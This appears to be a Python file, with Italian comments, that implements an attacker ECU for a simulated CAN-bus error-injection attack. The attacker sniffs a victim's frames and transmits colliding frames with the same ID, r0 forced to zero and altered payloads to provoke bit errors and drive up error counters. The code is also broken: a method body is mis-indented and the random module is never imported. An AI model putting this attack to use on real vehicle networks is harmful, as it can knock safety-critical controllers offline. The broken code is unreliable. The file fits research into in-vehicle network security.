# att.py

from ecu_base import ECU, Role, NodeState, ErrorFlagType, ERROR_FLAG_ID
import can
import time


def force_r0_to_zero(control_byte: int) -> int:
    """
    Forza il bit r0 (bit 5) a 0 nel primo byte del payload.
    In CAN reale r0 è sempre recessivo (1), qui lo simuliamo nel data[0].
    L'attaccante lo forza a 0 per creare il BIT ERROR.
    """
    return control_byte & ~(1 << 5)


class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'attaccante non trasmette ciclicamente, quindi di solito period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non usa il TX loop periodico della base
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)

    def _rx_loop(self):
        """
        RX loop specializzato per l'attaccante:
        - Sniffa tutti i frame
        - Quando vede la Vittima, genera il frame corrotto (r0=0)
        - Poi aspetta un eventuale ERROR_FLAG per aggiornare il suo TEC
        """
        while not self._stop:
            try:
                msg = self.bus.recv(timeout=0.1)
            except can.CanError:
                continue

            if msg is None:
                continue

            # Non facciamo la gestione generica di ERROR_FLAG della base,
            # perché qui l'attaccante gestisce da solo TX success / error.
            if msg.arbitration_id == ERROR_FLAG_ID:
                # Li ignoriamo qui: vengono gestiti nella finestra dopo l'attacco
                # (in _handle_normal_frame).
                continue

            self._handle_normal_frame(msg)

    def _handle_normal_frame(self, msg: can.Message):
    """
    L'Attaccante sniffa il bus e risponde solo al frame della Vittima.

    - Stesso arbitration_id della vittima
    - Stessi RTR, IDE, DLC
    - r0 forzato a 0
    - payload dati (byte 1..7) diverso da quello della vittima
    """
    if msg.arbitration_id != self.victim_id:
        # Ignora tutti i messaggi che non sono il bersaglio
        return

    if len(msg.data) < 1:
        # Niente da fare se il frame è vuoto (non dovrebbe succedere nel tuo modello)
        return

    # --- 1. Decodifica header della vittima (RTR, IDE, r0, DLC) ---
    victim_ctrl = msg.data[0]
    rtr = (victim_ctrl >> 7) & 0x01
    ide = (victim_ctrl >> 6) & 0x01
    dlc = victim_ctrl & 0x0F  # 4 bit di DLC

    # --- 2. Costruisci header dell'attaccante con r0 = 0 ---
    # bit7 = RTR, bit6 = IDE, bit5 = r0 (forzato a 0), bit[3:0] = DLC
    attacker_ctrl = (rtr << 7) | (ide << 6) | (0 << 5) | (dlc & 0x0F)

    attacker_data = bytearray(8)
    attacker_data[0] = attacker_ctrl

    # --- 3. Genera un payload applicativo diverso dalla vittima ---
    # byte 1..7: valori random, ma cerco di evitare di copiare pari pari i byte della vittima
    for i in range(1, 8):
        v_byte = msg.data[i] if i < len(msg.data) else 0
        # genera un byte random finché non è uguale a quello della vittima
        b = random.randint(0, 255)
        if b == v_byte:
            b = (b + 1) & 0xFF
        attacker_data[i] = b

    att_msg = can.Message(
        arbitration_id=self.victim_id,     # Stesso ID per garantire la collisione
        data=attacker_data,
        is_extended_id=msg.is_extended_id
    )

    try:
        self.currently_transmitting = True
        self.last_tx_data = bytes(attacker_data)
        self.last_tx_time = time.time()

        self.bus.send(att_msg)
        print(
            f"[{self.name}] ATTACK: "
            f"TX_V={msg.data.hex().upper()} → TX_A={att_msg.data.hex().upper()}"
        )

        error_detected = False
        response_msg = self.bus.recv(timeout=0.05)

        if response_msg is not None and response_msg.arbitration_id == ERROR_FLAG_ID:
            flag_type = ErrorFlagType(response_msg.data[0]) \
                        if response_msg.data and response_msg.data[0] in (0, 1) \
                        else ErrorFlagType.ACTIVE
            if flag_type == ErrorFlagType.ACTIVE:
                self._on_tx_error()   # TEC +8
                error_detected = True
                print(f"[{self.name}] att → TEC +8: Rilevato ERROR FLAG ACTIVE della Vittima.")

        if not error_detected:
            # Nessun ERROR_FLAG ACTIVE visto → TX considerato OK
            self._on_tx_success()    # TEC -1
            print(f"[{self.name}] att → TEC -1: (TX successo).")

    except can.CanError as e:
        print(f"[{self.name}] Errore invio frame attacco: {e}")
        self._on_tx_error()

    finally:
        time.sleep(0.01)
        self.currently_transmitting = False
